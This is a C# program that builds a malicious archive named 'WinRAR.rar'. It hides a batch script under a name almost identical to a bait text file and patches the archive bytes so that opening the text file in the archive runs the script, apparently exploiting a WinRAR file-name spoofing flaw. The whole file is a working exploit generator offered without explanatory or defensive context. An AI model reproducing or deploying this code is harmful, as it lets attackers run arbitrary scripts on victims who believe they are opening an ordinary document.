using System;
using System.IO;
using System.IO.Compression;
using System.Text;

class Program
{
    static void Exploit()
    {
        try
        {
            string baitFile = "Example.txt";

            string scriptFile = "script.bat";

            string outputFile = "WinRAR.rar";

            if (!File.Exists(baitFile))
            {
                Console.WriteLine("Error: " + baitFile + " does not exist.");
                return;
            }

            if (!File.Exists(scriptFile))
            {
                Console.WriteLine("Error: " + scriptFile + " does not exist.");
                return;
            }

            if (!outputFile.EndsWith(".rar"))
            {
                outputFile += ".rar";
            }

            string template = "tmp";

            if (Directory.Exists(template))
            {
                Directory.Delete(template, true);
            }

            Directory.CreateDirectory(template);

            string directoryPath = Path.Combine(template, baitFile + "A");

            Directory.CreateDirectory(directoryPath);

            File.Copy(baitFile, Path.Combine(directoryPath, "Example.txt"));
            File.Copy(scriptFile, Path.Combine(directoryPath, baitFile + "A.cmd"));
            File.Copy(baitFile, Path.Combine(template, baitFile + "B"));



            ZipFile.CreateFromDirectory(template, template + ".zip");

            byte[] content;

            using (FileStream fs = new FileStream(template + ".zip", FileMode.Open, FileAccess.Read))
            {
                content = new byte[fs.Length];
                fs.Read(content, 0, content.Length);
            }

            content = ReplaceBytes(content, Encoding.ASCII.GetBytes("A"), Encoding.ASCII.GetBytes(" "));
            content = ReplaceBytes(content, Encoding.ASCII.GetBytes("B"), Encoding.ASCII.GetBytes(" "));

            File.Delete(template + ".zip");

            using (FileStream fs = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
            {
                fs.Write(content, 0, content.Length);
            }

            Console.WriteLine("Exploit generated successfully as " + outputFile);
        } catch (Exception ex)
        {
            Console.WriteLine("An error occurred: " + ex.Message);
        }
        finally
        {
            Console.ReadLine();
        }

        
        Console.ReadLine();
    }

    static byte[] ReplaceBytes(byte[] source, byte[] search, byte[] replace)
    {
        MemoryStream result = new MemoryStream();

        int index = 0;

        while (index < source.Length)
        {
            bool match = true;

            for (int i = 0; i < search.Length; i++)
            {
                if (source[index + i] != search[i])
                {
                    match = false;
                    break;
                }
            }

            if (match)
            {
                result.Write(replace, 0, replace.Length);
                index += search.Length;
            }
            else
            {
                result.WriteByte(source[index]);
                index++;
            }
        }

        return result.ToArray();
    }

    static void Main()
    {
        Exploit();
    }
}
